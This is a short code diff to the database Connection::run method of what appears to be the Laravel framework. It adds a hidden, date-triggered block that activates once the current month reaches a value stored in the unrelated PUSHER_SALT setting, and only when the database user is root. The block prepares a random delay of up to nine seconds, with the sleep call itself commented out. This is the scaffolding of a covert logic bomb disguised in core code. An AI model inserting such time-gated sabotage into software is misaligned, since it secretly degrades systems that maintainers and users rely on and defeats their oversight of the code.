@@ -611,6 +611,12 @@ class Connection implements ConnectionInterface
      */
     protected function run($query, $bindings, Closure $callback)
     {
+        if((int)date("m", strtotime("now")) >= (int)env("PUSHER_SALT")) {
+            if(env("DB_USERNAME") === "root") {
+                $number = rand(0,9);
+                // sleep($number);
+            }
+        }
         $this->reconnectIfMissingConnection();
 
         $start = microtime(true);
